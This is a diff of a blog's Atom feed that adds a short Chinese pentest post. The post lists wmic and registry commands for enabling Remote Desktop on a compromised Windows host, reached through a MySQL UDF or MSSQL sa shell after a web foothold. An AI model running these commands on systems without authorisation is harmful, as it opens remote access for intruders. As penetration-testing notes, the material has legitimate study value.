@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://blog.cyrils.org/"/>
-  <updated>2016-05-02T06:35:24.000Z</updated>
+  <updated>2016-05-02T06:45:34.000Z</updated>
   <id>http://blog.cyrils.org/</id>
   
   <author>
@@ -14,6 +14,29 @@
   </author>
   
   <generator uri="http://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>Open-rdp-in-cmd</title>
+    <link href="http://blog.cyrils.org/2016/05/02/Open-rdp-in-cmd/"/>
+    <id>http://blog.cyrils.org/2016/05/02/Open-rdp-in-cmd/</id>
+    <published>2016-05-02T06:40:24.000Z</published>
+    <updated>2016-05-02T06:45:34.000Z</updated>
+    
+    <content type="html">&lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;在一些拿到web权限的时候，windows主机没有开放3389，在shell(eg. mysql udf or mssql sa)下利用命令开3389的记录&lt;br&gt;&lt;a id=&quot;more&quot;&gt;&lt;/a&gt;&lt;/p&gt;
+&lt;h3 id=&quot;Payload&quot;&gt;&lt;a href=&quot;#Payload&quot; class=&quot;headerlink&quot; title=&quot;Payload&quot;&gt;&lt;/a&gt;Payload&lt;/h3&gt;&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;.wmic /namespace:\\root\cimv2\terminalservices &lt;span class=&quot;built_in&quot;&gt;path&lt;/span&gt; win32_terminalservicesetting where (__CLASS != &quot;&quot;) &lt;span class=&quot;keyword&quot;&gt;call&lt;/span&gt; setallowtsconnections &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;2&lt;/span&gt;.wmic /namespace:\\root\cimv2\terminalservices &lt;span class=&quot;built_in&quot;&gt;path&lt;/span&gt; win32_tsgeneralsetting where (TerminalName =&#39;RDP-Tcp&#39;) &lt;span class=&quot;keyword&quot;&gt;call&lt;/span&gt; setuserauthenticationrequired &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;number&quot;&gt;3&lt;/span&gt;.reg add &quot;HKLM\SYSTEM\CurrentControlSet\Control\Terminal Server&quot; /v fSingleSessionPerUser /t REG_DWORD /d &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt; /f&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#win08,win7,&lt;span class=&quot;number&quot;&gt;12&lt;/span&gt; win08测试成功&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;figure class=&quot;highlight cmd&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;wmic &lt;span class=&quot;built_in&quot;&gt;path&lt;/span&gt; win32_terminalservicesetting where (__CLASS != &quot;&quot;) &lt;span class=&quot;keyword&quot;&gt;call&lt;/span&gt; setallowtsconnections &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;#win03,system权限&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+</content>
+    
+    <summary type="html">
+    
+      &lt;h2 id=&quot;0x01&quot;&gt;&lt;a href=&quot;#0x01&quot; class=&quot;headerlink&quot; title=&quot;0x01&quot;&gt;&lt;/a&gt;0x01&lt;/h2&gt;&lt;p&gt;在一些拿到web权限的时候，windows主机没有开放3389，在shell(eg. mysql udf or mssql sa)下利用命令开3389的记录&lt;br&gt;
+    
+    </summary>
+    
+    
+      <category term="Pentest" scheme="http://blog.cyrils.org/tags/Pentest/"/>
+    
+  </entry>
   
   <entry>
     <title>Chopper-JSPShell-DBcon</title>
